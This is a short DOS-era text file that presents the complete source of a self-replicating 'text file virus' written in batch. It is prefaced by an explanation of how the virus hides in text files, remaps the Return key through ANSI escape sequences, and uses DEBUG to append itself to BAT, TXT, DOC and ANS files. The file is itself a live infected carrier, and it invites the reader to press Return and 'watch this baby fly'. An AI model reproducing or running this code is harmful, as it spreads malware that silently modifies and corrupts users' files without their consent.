The Text File Virus   

This is a batch file which can hide in a text file. It spreads when
an infected file is TYPE'd or an infected batch is run. If this
file is TYPE'd you will not see much and the return key is 'loaded'
to extract the batch file and run it. The batch attaches itself to
all BAT, TXT, DOC and ANS files in the current directory.

If the infected file is renamed and TYPE'd it won't work because
the filename is contained into the bomb loader. Debug is used to
construct a specific bomb for each file it infects. It will not
re-infect files, if it can't do anything it just quits.

This is the second version - the first only did TXT files but worked
so well I had to do something with it. This has got to be the weirdest
batch program I've ever written.

This program was written for entertainment and educational purposes
only. I hope you are amused and learn something. If you cannot see the
code below it probably means that you TYPE'd this file and the ANSI
bomb has been loaded unless your system is protected. If you've got 
important files in this directory that you do not wish to have this 
code appended to, turn the computer off now! 

Otherwise, press Return and watch this baby fly!



::[8m TxT_
@echo off%_TxT_%
if '%1=='TxT_ goto TxT_
if '%1=='Bat goto TxT_Bat
if not '%0=='\txT_ goto TxT_InBat
echo [13;13p %_TxT_%
cls %_TxT_%
::[7A TxT_
:TxT_Search
for %%v in (*.BAT *.TXT *.DOC *.ANS) do call \TxT_ TxT_ %%v
goto TxT_end
:TxT_InBat
if exist \TxT_.bat goto TxT_Search
if not exist %0.bat goto TxT_end
find "TxT_"<%0.bat>\TxT_.bat
goto TxT_Search
:TxT_ [9A
find "TxT_"<%2>nul
if not errorlevel 1 goto TxT_end
find "TxT_"<\TxT_.bat>>%2
:: [4A TxT_
echo e 13A "                        ">TxT_.tmp
echo e 100 3A 3A 1B "[13" 3B 22 03 "find /i">>TxT_.tmp
echo e 110 20 22 3B 33 34 3B 22 "txt_" 22 3B 33 34 3B 22 3C>>TxT_.tmp
echo e 122 "%2" 3E "\txt_.bat" 22 3B "13" 3B """\txT_""" 3B "13p" 1B "[0m" 0A 0D>>TxT_.tmp
echo n TxT_.tmn>>TxT_.tmp
echo r cx>>TxT_.tmp
:: [7A TxT_
echo 50>>TxT_.tmp
echo w>>TxT_.tmp
echo q>>TxT_.tmp
debug<TxT_.tmp>nul
type TxT_.tmn>>%2
del TxT_.tm?
:TxT_end [4A
::[13;"find /i ";34;"txt_";34;"<TEXTVIR2.FIL>\txt_.bat";13;"\txT_";13p[0m


-----
